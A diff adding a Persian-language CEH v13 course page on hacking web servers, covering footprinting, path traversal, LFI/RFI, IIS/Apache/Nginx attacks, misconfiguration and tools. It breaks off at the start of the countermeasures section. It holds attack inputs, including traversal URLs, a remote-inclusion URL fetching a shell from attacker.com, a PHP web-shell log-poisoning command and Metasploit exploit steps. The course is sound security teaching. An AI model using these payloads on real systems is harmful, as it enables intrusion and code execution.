@@ -1,0 +1,1013 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ماژول ۱۳ - Hacking Web Servers - دوره CEH V13</title>
+    <link rel="stylesheet" href="../../style.css">
+    <style>
+        .toc {
+            background: #eef3f7;
+            padding: 15px 25px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            border-right: 4px solid #2a7de1;
+        }
+        .toc ul {
+            columns: 2;
+            list-style: none;
+            padding: 0;
+            margin: 10px 0;
+        }
+        .toc ul li {
+            margin: 6px 0;
+            padding: 4px 8px;
+            border-radius: 6px;
+            transition: background 0.2s;
+        }
+        .toc ul li:hover {
+            background: #dce3ea;
+        }
+        .toc ul li a {
+            text-decoration: none;
+            color: #0b3b5c;
+            font-weight: 500;
+        }
+        .toc ul li a:hover {
+            color: #2a7de1;
+        }
+        .copy-btn {
+            background: #2a7de1;
+            color: white;
+            border: none;
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            float: left;
+            transition: background 0.2s;
+        }
+        .copy-btn:hover {
+            background: #1a5fb0;
+        }
+        .code-block {
+            position: relative;
+            background: #1e2a3a;
+            padding: 15px;
+            border-radius: 10px;
+            overflow-x: auto;
+            margin: 10px 0;
+            border-left: 5px solid #2a7de1;
+        }
+        .code-block code {
+            background: transparent;
+            border: none;
+            color: #e4eef7;
+            padding: 0;
+            font-size: 0.95rem;
+        }
+        .code-block .copy-btn {
+            position: absolute;
+            top: 8px;
+            left: 8px;
+            background: #4a5a7a;
+        }
+        .code-block .copy-btn:hover {
+            background: #2a7de1;
+        }
+        @media (max-width: 768px) {
+            .toc ul { columns: 1; }
+        }
+        table tr:hover {
+            background: #e8f0fe !important;
+        }
+        .highlight-box {
+            background: #e8f0fe;
+            border-right: 6px solid #ff9f1c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .warning-box {
+            background: #fef0e8;
+            border-right: 6px solid #e74c3c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .tip-box {
+            background: #e8fef0;
+            border-right: 6px solid #27ae60;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .info-box {
+            background: #e8f0fe;
+            border-right: 6px solid #2a7de1;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .table-responsive {
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            margin: 16px 0 12px 0;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        }
+        .glossary-term {
+            font-weight: 700;
+            color: #0b3b5c;
+            background: #e8f0fe;
+            padding: 2px 8px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== نوار ناوبری ===== -->
+    <div class="nav-bar">
+        <span dir='ltr'>📘 CEH V13</span>
+        <span dir='ltr'>
+            <a href="../../../index.html">خانه</a> |
+            <a href="../index.html">ماژول‌ها</a>
+        </span>
+    </div>
+
+    <h1>📚 ماژول ۱۳ – Hacking Web Servers</h1>
+
+    <!-- ===== فهرست مطالب ===== -->
+    <div class="toc">
+        <strong>📑 فهرست مطالب (کلیک کنید):</strong>
+        <ul>
+            <li><a href="#intro">🔰 مقدمه – وب‌سرورها و حملات به آنها</a></li>
+            <li><a href="#architecture">🏗️ معماری وب‌سرور</a></li>
+            <li><a href="#attacks">🎯 انواع حملات به وب‌سرور</a></li>
+            <li><a href="#footprinting">🔍 شناسایی وب‌سرور (Footprinting)</a></li>
+            <li><a href="#dir-traversal">📂 Directory Traversal</a></li>
+            <li><a href="#file-inclusion">📄 File Inclusion (LFI/RFI)</a></li>
+            <li><a href="#iis-attacks">🖥️ حملات به IIS</a></li>
+            <li><a href="#apache-attacks">🌐 حملات به Apache</a></li>
+            <li><a href="#nginx-attacks">⚡ حملات به Nginx</a></li>
+            <li><a href="#web-server-misconfig">⚙️ پیکربندی اشتباه وب‌سرور</a></li>
+            <li><a href="#tools">🛠️ ابزارهای هک وب‌سرور</a></li>
+            <li><a href="#ai-web-server">🤖 هوش مصنوعی در هک وب‌سرور</a></li>
+            <li><a href="#countermeasures">🛡️ راه‌های مقابله با حملات وب‌سرور</a></li>
+            <li><a href="#lab-exercise">🧪 کارگاه عملی</a></li>
+            <li><a href="#practice-exercises">📝 تمرین‌های عملی</a></li>
+            <li><a href="#glossary">📖 واژه‌نامه تخصصی</a></li>
+        </ul>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱: مقدمه -->
+    <!-- ============================================================ -->
+    <div class="card" id="intro">
+        <h2>🔰 مقدمه – وب‌سرورها و حملات به آنها</h2>
+        <p>
+            <b>وب‌سرور (Web Server)</b> نرم‌افزاری است که درخواست‌های HTTP/HTTPS کاربران را دریافت کرده و صفحات وب، فایل‌ها و سایر محتواها را در اختیار آنها قرار می‌دهد. وب‌سرورها یکی از اصلی‌ترین و حیاتی‌ترین اجزای زیرساخت اینترنت هستند و به دلیل قرار گرفتن در معرض کاربران عمومی، یکی از اهداف اصلی هکرها محسوب می‌شوند.
+        </p>
+        <p>
+            حملات به وب‌سرورها می‌توانند عواقب فاجعه‌باری داشته باشند، از جمله:
+        </p>
+        <ul>
+            <li><b>سرقت اطلاعات حساس:</b> دسترسی به پایگاه داده، فایل‌های پیکربندی و اطلاعات کاربران.</li>
+            <li><b>تخریب وب‌سایت:</b> تغییر محتوای صفحات، قرار دادن بدافزار یا حملات فیشینگ.</li>
+            <li><b>استفاده از سرور برای حملات دیگر:</b> تبدیل وب‌سرور به یک بات‌نت یا پل ارتباطی.</li>
+            <li><b>محروم‌سازی از سرویس (DoS):</b> از کار انداختن وب‌سایت برای کاربران عادی.</li>
+        </ul>
+        <p>
+            در این ماژول، با معماری وب‌سرورها، آسیب‌پذیری‌های رایج، روش‌های شناسایی و حملات مختلف آشنا خواهید شد و همچنین تکنیک‌های دفاعی را یاد خواهید گرفت.
+        </p>
+        <div class="warning-box">
+            <b>⚠️ هشدار اخلاقی:</b> حملات به وب‌سرورها بدون مجوز جرم هستند. تمام تمرینات این ماژول فقط در محیط‌های آزمایشگاهی با مجوز انجام شوند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۲: معماری وب‌سرور -->
+    <!-- ============================================================ -->
+    <div class="card" id="architecture">
+        <h2>🏗️ معماری وب‌سرور (Web Server Architecture)</h2>
+        <p>
+            درک معماری وب‌سرور برای شناسایی نقاط ضعف و حملات مؤثر ضروری است. یک وب‌سرور معمولاً از اجزای زیر تشکیل شده است:
+        </p>
+
+        <h3>📌 اجزای اصلی یک وب‌سرور:</h3>
+        <ul>
+            <li><b>سیستم‌عامل:</b> لینوکس، ویندوز، یا Unix که وب‌سرور روی آن اجرا می‌شود.</li>
+            <li><b>نرم‌افزار وب‌سرور:</b> Apache، Nginx، IIS، Tomcat، و … که درخواست‌های HTTP را مدیریت می‌کنند.</li>
+            <li><b>موتور تفسیر:</b> PHP، ASP.NET، Python، Ruby، و … برای اجرای کدهای سمت سرور.</li>
+            <li><b>پایگاه داده:</b> MySQL، PostgreSQL، SQL Server، و … برای ذخیره داده‌ها.</li>
+            <li><b>فایل‌ها و محتوا:</b> صفحات HTML، تصاویر، CSS، جاوااسکریپت، و …</li>
+            <li><b>فایروال و سیستم‌های امنیتی:</b> برای محافظت از وب‌سرور در برابر حملات.</li>
+        </ul>
+
+        <h3>📌 نحوه عملکرد:</h3>
+        <ol>
+            <li>کاربر یک درخواست HTTP (مثلاً برای صفحه index.html) به وب‌سرور ارسال می‌کند.</li>
+            <li>وب‌سرور درخواست را دریافت کرده و بر اساس URL و هدرها، آن را به فایل مناسب یا برنامه‌ای خاص هدایت می‌کند.</li>
+            <li>اگر درخواست به یک فایل استاتیک (HTML, CSS, JS) باشد، وب‌سرور فایل را مستقیماً ارسال می‌کند.</li>
+            <li>اگر درخواست به یک برنامه پویا (PHP, ASP.NET) باشد، موتور تفسیر کد را اجرا کرده و خروجی را به وب‌سرور برمی‌گرداند.</li>
+            <li>وب‌سرور پاسخ را به کاربر ارسال می‌کند.</li>
+        </ol>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> هرچه پیچیدگی معماری بیشتر باشد، احتمال وجود آسیب‌پذیری‌های پیکربندی و کدنویسی نیز بیشتر است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۳: انواع حملات به وب‌سرور -->
+    <!-- ============================================================ -->
+    <div class="card" id="attacks">
+        <h2>🎯 انواع حملات به وب‌سرور</h2>
+        <p>
+            حملات به وب‌سرورها را می‌توان بر اساس هدف و روش اجرا به دسته‌های زیر تقسیم کرد:
+        </p>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th>نوع حمله</th><th>توضیح</th><th>مثال</th></tr>
+                <tr><td><b>Directory Traversal</b></td><td>دسترسی به فایل‌های خارج از ریشه وب</td><td>خواندن فایل <code dir='ltr'>/etc/passwd</code></td></tr>
+                <tr><td><b>File Inclusion (LFI/RFI)</b></td><td>اجرای فایل‌های محلی یا از راه دور</td><td>اجرای شل PHP از راه دور</td></tr>
+                <tr><td><b>Code Injection</b></td><td>تزریق کد به وب‌سرور</td><td>تزریق کد PHP به سرور</td></tr>
+                <tr><td><b>Misconfiguration Attacks</b></td><td>سوءاستفاده از پیکربندی اشتباه</td><td>دسترسی به پوشه‌های حساس</td></tr>
+                <tr><td><b>Brute Force</b></td><td>حدس رمزهای مدیریت</td><td>حمله به صفحه مدیریت</td></tr>
+                <tr><td><b>DoS/DDoS</b></td><td>محروم‌سازی از سرویس</td><td>HTTP Flood</td></tr>
+                <tr><td><b>HTTP Smuggling</b></td><td>دستکاری درخواست‌های HTTP</td><td>دور زدن فایروال</td></tr>
+                <tr><td><b>Web Cache Poisoning</b></td><td>مسموم کردن کش وب</td><td>تزریق محتوای مخرب به کش</td></tr>
+                <tr><td><b>Directory/Path Traversal</b></td><td>خروج از دایرکتوری ریشه</td><td>مشاهده فایل‌های سیستمی</td></tr>
+                <tr><td><b>HTTP Response Splitting</b></td><td>تزریق هدرهای HTTP</td><td>تزریق کوکی یا کد</td></tr>
+            </table>
+        </div>
+
+        <div class="info-box">
+            <b>💡 نکته:</b> بسیاری از حملات به وب‌سرورها ناشی از پیکربندی اشتباه یا به‌روز نبودن نرم‌افزار هستند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۴: شناسایی وب‌سرور -->
+    <!-- ============================================================ -->
+    <div class="card" id="footprinting">
+        <h2>🔍 شناسایی وب‌سرور (Web Server Footprinting)</h2>
+        <p>
+            قبل از هر حمله، هکر باید اطلاعات دقیقی از وب‌سرور هدف جمع‌آوری کند. این فرآیند <b>شناسایی (Footprinting)</b> نام دارد.
+        </p>
+
+        <h3>📌 اطلاعات قابل جمع‌آوری:</h3>
+        <ul>
+            <li><b>نوع وب‌سرور:</b> Apache، Nginx، IIS، Tomcat، …</li>
+            <li><b>نسخه وب‌سرور:</b> برای پیدا کردن آسیب‌پذیری‌های شناخته‌شده.</li>
+            <li><b>سیستم‌عامل:</b> لینوکس، ویندوز، …</li>
+            <li><b>ماژول‌های نصب‌شده:</b> PHP، ASP.NET، Python، …</li>
+            <li><b>پورت‌های باز:</b> ۸۰ (HTTP)، ۴۴۳ (HTTPS)، و …</li>
+            <li><b>فایل‌های حساس:</b> robots.txt, sitemap.xml, .htaccess, …</li>
+            <li><b>مدیریت و صفحات ورود:</b> /admin, /login, /wp-admin, …</li>
+        </ul>
+
+        <h3>📌 روش‌های شناسایی:</h3>
+        <ul>
+            <li><b>استفاده از Nmap:</b> اسکن پورت و تشخیص بنر.</li>
+            <li><b>استفاده از Netcat:</b> دریافت بنر با اتصال به پورت ۸۰ یا ۴۴۳.</li>
+            <li><b>استفاده از WhatWeb:</b> ابزار تخصصی شناسایی وب‌سرور.</li>
+            <li><b>استفاده از httprint:</b> شناسایی بر اساس امضای پاسخ.</li>
+            <li><b>بررسی فایل robots.txt:</b> پیدا کردن مسیرهای مخفی.</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># اسکن پورت و شناسایی وب‌سرور با Nmap
+nmap -sV -p 80,443 192.168.1.101
+
+# دریافت بنر با Netcat
+nc -nv 192.168.1.101 80
+HEAD / HTTP/1.0
+[Enter 2 بار]
+
+# شناسایی با WhatWeb
+whatweb http://192.168.1.101
+
+# بررسی robots.txt
+curl http://192.168.1.101/robots.txt</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> سرورهای مدرن ممکن است اطلاعات بنر را پنهان کنند یا اطلاعات جعلی نمایش دهند. برای شناسایی دقیق‌تر باید از چند روش استفاده کرد.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۵: Directory Traversal -->
+    <!-- ============================================================ -->
+    <div class="card" id="dir-traversal">
+        <h2>📂 Directory Traversal (Path Traversal)</h2>
+        <p>
+            <b>Directory Traversal</b> یکی از رایج‌ترین آسیب‌پذیری‌های وب‌سرورها است که در آن مهاجم با دستکاری پارامترهای URL یا مسیر فایل‌ها، به فایل‌های خارج از دایرکتوری ریشه وب دسترسی پیدا می‌کند.
+        </p>
+
+        <h3>📌 نحوه عملکرد:</h3>
+        <ul>
+            <li>برخی از برنامه‌های وب از پارامترهای URL برای تعیین مسیر فایل‌ها استفاده می‌کنند (مثل <code dir='ltr'>?page=about.html</code>).</li>
+            <li>اگر این پارامتر به درستی فیلتر نشود، مهاجم می‌تواند با استفاده از <code dir='ltr'>../</code> به فایل‌های سیستمی دسترسی پیدا کند.</li>
+        </ul>
+
+        <h3>📌 مثال‌ها:</h3>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># دسترسی به فایل /etc/passwd در لینوکس
+http://example.com/page?file=../../../../etc/passwd
+
+# دسترسی به فایل boot.ini در ویندوز
+http://example.com/page?file=../../../../boot.ini
+
+# دسترسی به فایل لاگ
+http://example.com/page?file=../../../../var/log/apache2/access.log</code></pre>
+        </div>
+
+        <h3>📌 ابزارهای تشخیص:</h3>
+        <ul>
+            <li><b>DirBuster:</b> پیدا کردن دایرکتوری‌های مخفی.</li>
+            <li><b>Gobuster:</b> اسکن دایرکتوری.</li>
+            <li><b>Burp Suite:</b> دستکاری و تست پارامترها.</li>
+            <li><b>OWASP ZAP:</b> اسکن خودکار آسیب‌پذیری‌ها.</li>
+        </ul>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> Directory Traversal یکی از خطرناک‌ترین آسیب‌پذیری‌هاست و می‌تواند به افشای کامل اطلاعات سیستم منجر شود.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۶: File Inclusion -->
+    <!-- ============================================================ -->
+    <div class="card" id="file-inclusion">
+        <h2>📄 File Inclusion (LFI / RFI)</h2>
+        <p>
+            <b>File Inclusion</b> یک آسیب‌پذیری است که در آن مهاجم می‌تواند فایل‌های محلی (LFI - Local File Inclusion) یا از راه دور (RFI - Remote File Inclusion) را در وب‌سرور اجرا کند.
+        </p>
+
+        <h3>📌 LFI (Local File Inclusion):</h3>
+        <ul>
+            <li>مهاجم از آسیب‌پذیری برای گنجاندن فایل‌های محلی استفاده می‌کند.</li>
+            <li>معمولاً با <code dir='ltr'>?page=../../../../etc/passwd</code> انجام می‌شود.</li>
+            <li>می‌تواند به خواندن فایل‌های سیستمی، لاگ‌ها، و حتی اجرای کد با تزریق لاگ (Log Injection) منجر شود.</li>
+        </ul>
+
+        <h3>📌 RFI (Remote File Inclusion):</h3>
+        <ul>
+            <li>مهاجم فایل‌ها را از یک سرور خارجی به سرور هدف تزریق می‌کند.</li>
+            <li>معمولاً با <code dir='ltr'>?page=http://attacker.com/shell.txt</code> انجام می‌شود.</li>
+            <li>این فایل معمولاً یک شل PHP یا ASP است که به مهاجم دسترسی کامل به سرور می‌دهد.</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># LFI - خواندن فایل لاگ
+http://example.com/index.php?page=../../../../var/log/apache2/access.log
+
+# RFI - اجرای شل از راه دور
+http://example.com/index.php?page=http://attacker.com/shell.php
+
+# تزریق لاگ برای LFI به RCE
+# ۱. ارسال درخواست با User-Agent مخرب
+curl -A "<?php system($_GET['cmd']); ?>" http://example.com
+
+# ۲. اجرای کد از طریق فایل لاگ
+http://example.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> برای جلوگیری از LFI/RFI، ورودی‌های کاربر را به دقت فیلتر کنید و از دستورات include با مسیرهای نسبی خودداری کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۷: حملات به IIS -->
+    <!-- ============================================================ -->
+    <div class="card" id="iis-attacks">
+        <h2>🖥️ حملات به IIS (Internet Information Services)</h2>
+        <p>
+            <b>IIS</b> وب‌سرور مایکروسافت است که روی ویندوز اجرا می‌شود. IIS به دلیل محبوبیت، هدف حملات متعددی قرار گرفته است.
+        </p>
+
+        <h3>📌 آسیب‌پذیری‌های معروف IIS:</h3>
+        <ul>
+            <li><b>IIS 6.0 WebDAV Vulnerability:</b> امکان اجرای کد از راه دور.</li>
+            <li><b>IIS 7.5 Short File Name Disclosure:</b> افشای نام‌های کوتاه فایل‌ها.</li>
+            <li><b>IIS 8.0/8.5 HTTP/2 Vulnerabilities:</b> حملات مبتنی بر HTTP/2.</li>
+            <li><b>Unicode Traversal:</b> استفاده از کدهای یونیکد برای دور زدن فیلترها.</li>
+        </ul>
+
+        <h3>📌 تکنیک‌های حمله به IIS:</h3>
+        <ul>
+            <li><b>WebDAV Exploitation:</b> استفاده از آسیب‌پذیری WebDAV برای اجرای کد.</li>
+            <li><b>Short File Name Attack:</b> پیدا کردن نام فایل‌ها با استفاده از نام‌های کوتاه 8.3.</li>
+            <li><b>IIS Directory Traversal:</b> دسترسی به فایل‌های خارج از ریشه وب.</li>
+            <li><b>IIS Unicode Traversal:</b> استفاده از کدهای یونیکد برای دور زدن.</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># اسکن آسیب‌پذیری IIS با Nmap
+nmap --script=iis-* -p 80,443 192.168.1.101
+
+# استفاده از Metasploit برای IIS Exploit
+msfconsole
+use exploit/windows/iis/iis_webdav_scstoragepath
+set RHOST 192.168.1.101
+exploit</code></pre>
+        </div>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> IIS به دلیل یکپارچگی با ویندوز، یکی از اهداف اصلی حملات است. همیشه IIS را به‌روز نگه دارید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۸: حملات به Apache -->
+    <!-- ============================================================ -->
+    <div class="card" id="apache-attacks">
+        <h2>🌐 حملات به Apache</h2>
+        <p>
+            <b>Apache</b> یکی از محبوب‌ترین وب‌سرورهای جهان است که روی لینوکس و ویندوز اجرا می‌شود. Apache به دلیل انعطاف‌پذیری، هدف حملات زیادی قرار می‌گیرد.
+        </p>
+
+        <h3>📌 آسیب‌پذیری‌های معروف Apache:</h3>
+        <ul>
+            <li><b>Apache Struts Vulnerability:</b> اجرای کد از راه دور.</li>
+            <li><b>Apache Heartbleed:</b> نشت اطلاعات در OpenSSL.</li>
+            <li><b>Apache mod_ssl Vulnerability:</b> حملات به ماژول SSL.</li>
+            <li><b>Apache .htaccess Bypass:</b> دور زدن محدودیت‌های .htaccess.</li>
+        </ul>
+
+        <h3>📌 تکنیک‌های حمله به Apache:</h3>
+        <ul>
+            <li><b>Apache Buffer Overflow:</b> سرریز بافر در نسخه‌های قدیمی.</li>
+            <li><b>Apache mod_rewrite Bypass:</b> دور زدن قوانین بازنویسی.</li>
+            <li><b>Apache Log Injection:</b> تزریق کد به لاگ‌ها برای LFI/RCE.</li>
+            <li><b>Apache SSL/TLS Attacks:</b> حملات به SSL مانند Heartbleed.</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># اسکن آسیب‌پذیری Apache با Nmap
+nmap --script=http-* -p 80,443 192.168.1.101
+
+# استفاده از Metasploit برای Apache Exploit
+msfconsole
+use exploit/multi/http/apache_struts_exec
+set RHOST 192.168.1.101
+exploit</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> Apache یکی از امن‌ترین وب‌سرورهاست، اما پیکربندی اشتباه می‌تواند آن را آسیب‌پذیر کند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۹: حملات به Nginx -->
+    <!-- ============================================================ -->
+    <div class="card" id="nginx-attacks">
+        <h2>⚡ حملات به Nginx</h2>
+        <p>
+            <b>Nginx</b> یک وب‌سرور پرسرعت و کم‌مصرف است که به عنوان پروکسی معکوس (Reverse Proxy) و لود بالانس نیز استفاده می‌شود. Nginx به دلیل سرعت و کارایی بالا، روزبه‌روز محبوب‌تر می‌شود.
+        </p>
+
+        <h3>📌 آسیب‌پذیری‌های معروف Nginx:</h3>
+        <ul>
+            <li><b>Nginx off-by-one (CVE-2017-7529):</b> نشت حافظه.</li>
+            <li><b>Nginx alias traversal:</b> دور زدن مسیرهای alias.</li>
+            <li><b>Nginx HTTP/2 DoS:</b> حملات محروم‌سازی با HTTP/2.</li>
+            <li><b>Nginx CRLF Injection:</b> تزریق هدرهای HTTP.</li>
+        </ul>
+
+        <h3>📌 تکنیک‌های حمله به Nginx:</h3>
+        <ul>
+            <li><b>Nginx Alias Traversal:</b> استفاده از alias برای دسترسی به فایل‌های خارج از ریشه.</li>
+            <li><b>Nginx Log Injection:</b> تزریق کد به لاگ‌ها برای LFI.</li>
+            <li><b>Nginx HTTP/2 Abuse:</b> سوءاستفاده از قابلیت‌های HTTP/2.</li>
+            <li><b>Nginx Misconfiguration:</b> سوءاستفاده از پیکربندی اشتباه.</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># اسکن آسیب‌پذیری Nginx با Nmap
+nmap --script=http-nginx-* -p 80,443 192.168.1.101
+
+# تست Alias Traversal
+http://example.com/static../config.php</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> Nginx به طور پیش‌فرض امن است، اما پیکربندی‌های اشتباه در فایل‌های <code dir='ltr'>nginx.conf</code> می‌تواند باعث آسیب‌پذیری شود.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۰: پیکربندی اشتباه وب‌سرور -->
+    <!-- ============================================================ -->
+    <div class="card" id="web-server-misconfig">
+        <h2>⚙️ پیکربندی اشتباه وب‌سرور (Misconfiguration)</h2>
+        <p>
+            پیکربندی اشتباه وب‌سرور یکی از رایج‌ترین علل نفوذ است. حتی اگر نرم‌افزار وب‌سرور امن باشد، یک پیکربندی اشتباه می‌تواند دروازه‌های ورود را به روی هکر باز کند.
+        </p>
+
+        <h3>📌 نمونه‌های پیکربندی اشتباه:</h3>
+        <ul>
+            <li><b>نمایش محتوای دایرکتوری (Directory Listing):</b> نمایش لیست فایل‌های دایرکتوری.</li>
+            <li><b>فایل‌های .htaccess قابل خواندن:</b> دسترسی به تنظیمات امنیتی.</li>
+            <li><b>پنل‌های مدیریت با رمز ضعیف:</b> ورود به صفحات مدیریت با رمز پیش‌فرض.</li>
+            <li><b>SSL/TLS ضعیف:</b> استفاده از پروتکل‌های قدیمی و آسیب‌پذیر.</li>
+            <li><b>باز بودن پورت‌های غیرضروری:</b> پورت‌های اضافی که به مهاجم اطلاعات می‌دهند.</li>
+            <li><b>فایل‌های پشتیبان عمومی:</b> فایل‌های .bak, .old, .backup قابل دسترس.</li>
+            <li><b>خطاهای نمایشی:</b> نمایش مسیرها و اطلاعات سیستم در پیام‌های خطا.</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># بررسی Directory Listing
+curl http://192.168.1.101/uploads/
+
+# بررسی فایل‌های پشتیبان
+curl http://192.168.1.101/config.php.bak
+curl http://192.168.1.101/.htaccess
+
+# بررسی نمایش خطا
+curl http://192.168.1.101/invalid_page</code></pre>
+        </div>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> پیکربندی اشتباه یکی از ساده‌ترین راه‌ها برای نفوذ است. همیشه تنظیمات وب‌سرور را با دقت بررسی کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۱: ابزارهای هک وب‌سرور -->
+    <!-- ============================================================ -->
+    <div class="card" id="tools">
+        <h2>🛠️ ابزارهای هک وب‌سرور</h2>
+        <p>
+            ابزارهای متعددی برای شناسایی و نفوذ به وب‌سرورها وجود دارند که در این بخش مهم‌ترین آنها را معرفی می‌کنیم:
+        </p>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th>ابزار</th><th>کاربرد اصلی</th><th>توضیح</th></tr>
+                <tr>
+                    <td><b>Nmap</b></td>
+                    <td>اسکن و شناسایی</td>
+                    <td>اسکن پورت، تشخیص بنر، اسکن آسیب‌پذیری</td>
+                </tr>
+                <tr>
+                    <td><b>Gobuster</b></td>
+                    <td>اسکن دایرکتوری</td>
+                    <td>پیدا کردن دایرکتوری‌ها و فایل‌های مخفی</td>
+                </tr>
+                <tr>
+                    <td><b>DirBuster</b></td>
+                    <td>اسکن دایرکتوری</td>
+                    <td>مشابه Gobuster با رابط گرافیکی</td>
+                </tr>
+                <tr>
+                    <td><b>Burp Suite</b></td>
+                    <td>تست نفوذ وب</td>
+                    <td>دستکاری درخواست‌ها، اسکن آسیب‌پذیری</td>
+                </tr>
+                <tr>
+                    <td><b>OWASP ZAP</b></td>
+                    <td>تست نفوذ وب</td>
+                    <td>نسخه متن‌باز Burp Suite</td>
+                </tr>
+                <tr>
+                    <td><b>Nikto</b></td>
+                    <td>اسکن آسیب‌پذیری وب‌سرور</td>
+                    <td>بررسی پیکربندی و آسیب‌پذیری‌های شناخته‌شده</td>
+                </tr>
+                <tr>
+                    <td><b>Metasploit</b></td>
+                    <td>بهره‌برداری</td>
+                    <td>ماژول‌های exploit برای وب‌سرورها</td>
+                </tr>
+                <tr>
+                    <td><b>WhatWeb</b></td>
+                    <td>شناسایی وب‌سرور</td>
+                    <td>شناسایی نوع و نسخه وب‌سرور</td>
+                </tr>
+                <tr>
+                    <td><b>WPScan</b></td>
+                    <td>هک وردپرس</td>
+                    <td>اسکن آسیب‌پذیری وردپرس</td>
+                </tr>
+                <tr>
+                    <td><b>JoomScan</b></td>
+                    <td>هک جوملا</td>
+                    <td>اسکن آسیب‌پذیری جوملا</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># استفاده از Nikto برای اسکن وب‌سرور
+nikto -h http://192.168.1.101
+
+# استفاده از Gobuster برای اسکن دایرکتوری
+gobuster dir -u http://192.168.1.101 -w /usr/share/wordlists/dirb/common.txt
+
+# استفاده از WPScan برای وردپرس
+wpscan --url http://192.168.1.101/wordpress --enumerate</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> ترکیب چند ابزار می‌تواند اطلاعات کامل‌تری از وب‌سرور هدف به دست دهد.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۲: هوش مصنوعی در هک وب‌سرور -->
+    <!-- ============================================================ -->
+    <div class="card" id="ai-web-server">
+        <h2>🤖 هوش مصنوعی در هک وب‌سرور</h2>
+        <p>
+            CEH v13 به عنوان <b>اولین نسخه‌ای که هوش مصنوعی را در تمام مراحل هک قانونمند ادغام کرده</b>، به نقش هوش مصنوعی در هک وب‌سرورها نیز می‌پردازد.
+        </p>
+
+        <h3>📌 نقش هوش مصنوعی در هک وب‌سرور:</h3>
+        <ul>
+            <li><b>شناسایی خودکار آسیب‌پذیری‌ها:</b> AI می‌تواند کد وب‌سرور را تحلیل کرده و آسیب‌پذیری‌ها را پیدا کند.</li>
+            <li><b>تولید Payloadهای هوشمند:</b> AI می‌تواند payloadهایی تولید کند که از تشخیص فرار کنند.</li>
+            <li><b>شکار خودکار آسیب‌پذیری‌های پیکربندی:</b> AI می‌تواند پیکربندی اشتباه را شناسایی کند.</li>
+            <li><b>تحلیل لاگ‌ها برای شناسایی حملات:</b> AI می‌تواند الگوهای حمله را در لاگ‌ها پیدا کند.</li>
+        </ul>
+
+        <h3>📌 ابزارهای AI-Powered Web Server Hacking:</h3>
+        <ul>
+            <li><b>AI-Based Vulnerability Scanners:</b> اسکنرهای مبتنی بر AI.</li>
+            <li><b>AI-Powered Payload Generators:</b> تولید payloadهای هوشمند.</li>
+            <li><b>AI-Driven Log Analysis:</b> تحلیل لاگ‌ها با AI.</li>
+        </ul>
+
+        <div class="info-box">
+            <b>💡 چرا هوش مصنوعی در هک وب‌سرور مهم است؟</b>
+            <p>
+                هوش مصنوعی می‌تواند آسیب‌پذیری‌های پنهان را سریع‌تر و دقیق‌تر از روش‌های دستی پیدا کند و حملات هدفمندتری طراحی کند.
+            </p>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۳: راه‌های مقابله با حملات وب‌سرور -->
+    <!-- ============================================================ -->
+    <div class="card" id="countermeasures">
+        <h2>🛡️ راه‌های مقابله با حملات وب‌سرور (Countermeasures)</h2>
+        <p>
+            برای محافظت از وب‌سرور در برابر حملات، سازمان‌ها و مدیران باید اقدامات زیر را انجام دهند:
+        </p>
+
+        <h3>📌 اقدامات کلی:</h3>
+        <ul>
